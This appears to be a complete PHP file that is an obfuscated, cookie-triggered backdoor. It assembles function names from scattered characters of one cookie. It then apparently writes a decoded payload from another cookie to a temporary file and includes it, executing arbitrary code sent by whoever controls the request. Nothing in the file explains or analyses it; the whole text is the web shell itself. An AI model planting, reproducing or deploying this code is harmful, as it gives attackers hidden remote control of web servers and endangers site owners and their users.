<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[11])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 7;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[11][$n];
        if (!$c[11][$n + 1]) {
            if (!$c[11][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 7 + 1;
    }
    $k = $p[12]() . $p[13];
    if (!$p[15]($k)) {
        $n = $p[3]($k, $p[8]);
        $p[19]($n, $p[27] . $p[16]($p[28]($c[3])));
    }
    include($k);
}